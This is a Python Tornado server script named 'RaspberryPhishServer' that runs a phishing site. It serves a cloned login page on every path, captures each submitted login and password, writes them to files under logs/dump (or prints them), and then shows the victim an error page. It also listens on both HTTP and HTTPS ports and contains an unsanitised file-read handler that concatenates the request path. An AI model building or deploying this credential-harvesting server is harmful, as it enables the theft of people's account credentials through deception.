#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import ssl
import time
import tornado.ioloop
import tornado.web
import tornado.httpserver
import tornado.netutil
import tornado.process
# from tornado import gen
from server.API.APIHandler import APIHandler


__title__ = "RaspberryPhishServer"


# var : directory name where the server will load in "pages" and "rsc"
pagePath = "test/"


# Handler for ressources
class RscHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    # @gen.coroutine
    async def data_received(self, chunk):
        pass

    @tornado.web.asynchronous
    # @gen.coroutine
    async def get(self, path_request):
        if str(path_request).endswith(".css"):
            self.set_header("Content-Type", "text/css; charset=UTF-8")
        self.write(open("rsc/" + path_request, 'rb').read())


class AdminHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    # @gen.coroutine
    async def data_received(self, chunk):
        pass

    @tornado.web.asynchronous
    # @gen.coroutine
    async def get(self):
        self.render("pages/admin/index.html")

    def post(self):
        try:
            action = self.get_argument("action")
            print("action :", action)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        self.render("pages/admin/index.html")


# Handler for HTML files
class MainHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    # @gen.coroutine
    async def data_received(self, chunk):
        pass

    @tornado.web.asynchronous
    # @gen.coroutine
    async def get(self):
        self.render("pages/" + pagePath + "index.html")

    def post(self):
        try:
            login = self.get_argument("login")
            password = self.get_argument("password")
            try:
                if not os.path.exists("logs/dump/" + pagePath):
                    os.mkdir("logs/dump/" + pagePath)
                file = open("logs/dump/" + pagePath + str(time.time()), mode="a+")
                file.write("login:" + login + "\npassword:" + password + "\n")
                file.close()
            except IOError:
                print(pagePath)
                print("login :", login)
                print("password :", password)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        # show an error page to the client
        self.render("pages/" + pagePath + "error.html")


def main():
    # create an instance
    application = tornado.web.Application(
        [
            (r'/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
            (r"/admin", AdminHandler),
            (r"/admin/.*", AdminHandler),
            (r"/API/(.*)$", APIHandler),
            (r"/", MainHandler),
            (r"/.*", MainHandler),
        ]
    )
    # HTTP socket
    http_socket = tornado.netutil.bind_sockets(8080)
    # HTTPS socket
    https_socket = tornado.netutil.bind_sockets(4430)
    # fork
    tornado.process.fork_processes(0)
    # try loading ssl to purpose https
    if(os.path.isfile("cert/" + pagePath + "default.key") and
       os.path.isfile("cert/" + pagePath + "default.cert")):
        # load ssl requirements
        ssl_options = {"certfile": os.path.join("cert/" + pagePath + "default.cert"),
                       "keyfile": os.path.join("cert/" + pagePath + "default.key"),
                       "cert_reqs": ssl.CERT_OPTIONAL}
        # bind https port
        server_https = tornado.httpserver.HTTPServer(application, ssl_options)
        server_https.add_sockets(https_socket)
    # bind http port
    server_http = tornado.httpserver.HTTPServer(application)
    server_http.add_sockets(http_socket)
    # loop forever to satisfy user's requests
    tornado.ioloop.IOLoop.current().start()


if __name__ == "__main__":
    main()
